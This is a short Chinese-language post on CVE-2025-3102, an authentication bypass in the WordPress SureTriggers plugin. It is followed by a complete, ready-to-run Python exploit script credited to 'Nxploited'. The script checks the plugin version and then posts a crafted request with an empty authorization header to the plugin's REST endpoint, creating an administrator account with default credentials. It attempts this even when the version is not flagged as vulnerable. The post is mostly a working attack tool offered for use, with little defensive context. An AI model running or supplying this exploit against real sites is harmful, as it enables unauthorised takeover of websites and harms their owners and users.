## WordPress SureTriggers Plugin存在身份验证绕过漏洞(CVE-2025-3102)

WordPress 的一体化自动化平台插件存在身份验证绕过漏洞，导致创建管理员帐户。该漏洞是由于在 1.0.78 及之前的所有版本中，“autheticate_user”函​​数中“secret_key”值的空值检查缺失所致。
这使得未经身份验证的攻击者能够在安装并激活该插件但未配置 API 密钥的情况下，在目标网站上创建管理员帐户。


## 漏洞利用python脚本
```python
import argparse
import requests
import json
import time
import re


requests.packages.urllib3.disable_warnings()


def display_banner():
    banner = """
 @@@@@@@  @@@  @@@  @@@@@@@@              @@@@@@    @@@@@@@@    @@@@@@   @@@@@@@             @@@@@@     @@@   @@@@@@@@    @@@@@@   
@@@@@@@@  @@@  @@@  @@@@@@@@             @@@@@@@@  @@@@@@@@@@  @@@@@@@@  @@@@@@@             @@@@@@@   @@@@  @@@@@@@@@@  @@@@@@@@  
!@@       @@!  @@@  @@!                       @@@  @@!   @@@@       @@@  !@@                     @@@  @@@!!  @@!   @@@@       @@@  
!@!       !@!  @!@  !@!                      @!@   !@!  @!@!@      @!@   !@!                     @!@    !@!  !@!  @!@!@      @!@   
!@!       @!@  !@!  @!!!:!    @!@!@!@!@     !!@    @!@ @! !@!     !!@    !!@@!!   @!@!@!@!@  @!@!!@     @!@  @!@ @! !@!     !!@    
!!!       !@!  !!!  !!!!!:    !!!@!@!!!    !!:     !@!!!  !!!    !!:     @!!@!!!  !!!@!@!!!  !!@!@!     !@!  !@!!!  !!!    !!:     
:!!       :!:  !!:  !!:                   !:!      !!:!   !!!   !:!          !:!                 !!:    !!:  !!:!   !!!   !:!      
:!:        ::!!:!   :!:                  :!:       :!:    !:!  :!:           !:!                 :!:    :!:  :!:    !:!  :!:       
 ::: :::    ::::     :: ::::             :: :::::  ::::::: ::  :: :::::  :::: ::             :: ::::    :::  ::::::: ::  :: :::::  
 :: :: :     :      : :: ::              :: : :::   : : :  :   :: : :::  :: : :               : : :      ::   : : :  :   :: : :::  
                                      Exploit By: Nxploited ( Khaled Alenazi )
"""
    print(banner)


def fetch_plugin_version(target_url):
    try:
        readme_url = f"{target_url.rstrip('/')}/wp-content/plugins/suretriggers/readme.txt"
        response = requests.get(readme_url, timeout=10, verify=False)
        if response.status_code == 200:
            match = re.search(r"Stable tag:\s*(\d+\.\d+\.\d+)", response.text)
            if match:
                return match.group(1)
        return None
    except requests.RequestException as e:
        print(f"[!] Error fetching plugin version: {e}")
        return None


def is_version_vulnerable(version):
    try:
        version_parts = list(map(int, version.split(".")))
        return version_parts <= [1, 0, 78]
    except ValueError:
        print("[!] Error parsing version.")
        return False


def prepare_headers():
    return {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        "Content-Type": "application/json",
        "st_authorization": ""
    }


def build_payload(email, username, password):
    return {
        "integration": "WordPress",
        "type_event": "create_user_if_not_exists",
        "selected_options": {
            "user_email": email,
            "user_name": username,
            "password": password
        },
        "fields": [],
        "context": {}
    }


def send_exploit_request(endpoint, headers, payload):
    try:
        response = requests.post(endpoint, headers=headers, json=payload, timeout=15, verify=False)
        return response
    except requests.RequestException as e:
        print(f"[-] Exploit request failed: {e}")
        return None


def handle_response(response, username, password):
    if not response:
        print("[-] No response received.")
        return
    try:
        response_data = response.json()
        if response_data.get("success"):
            print("[+] Exploit successful!")
            print(f"[+] Credentials: {username}:{password}")
        else:
            print("[-] Exploit failed. Response indicated failure.")
    except json.JSONDecodeError:
        print("[-] Failed to parse JSON response.")


def run_exploit(target_url, email, username, password):
    print("[*] Fetching plugin version...")
    version = fetch_plugin_version(target_url)
    if version:
        print(f"[+] Plugin version: {version}")
        if is_version_vulnerable(version):
            print("[+] Vulnerable version detected. Proceeding with exploit...")
        else:
            print("[-] Target version is not vulnerable. Attempting exploit anyway...")
    else:
        print("[-] Could not determine plugin version. Proceeding without version verification.")

    headers = prepare_headers()
    payload = build_payload(email, username, password)
    endpoint = f"{target_url.rstrip('/')}/wp-json/sure-triggers/v1/automation/action"
    response = send_exploit_request(endpoint, headers, payload)
    handle_response(response, username, password)


def main():
    display_banner()
    parser = argparse.ArgumentParser(description="SureTriggers <= 1.0.78 - Authorization Bypass # By: Nxploited | Khaled Alenazi")
    parser.add_argument("-u", "--url", required=True, help="Target WordPress base URL")
    parser.add_argument("-nmail", "--newmail", default="NxploitBot@gmail.com", help="Email to register")
    parser.add_argument("-nu", "--newuser", default="Nxploited", help="Username to register")
    parser.add_argument("-np", "--newpassword", default="nxploit123", help="Password for the new user")
    args = parser.parse_args()

    run_exploit(args.url, args.newmail, args.newuser, args.newpassword)


if __name__ == "__main__":
    main()
```

<原文><https://github.com/Nxploited/CVE-2025-3102>
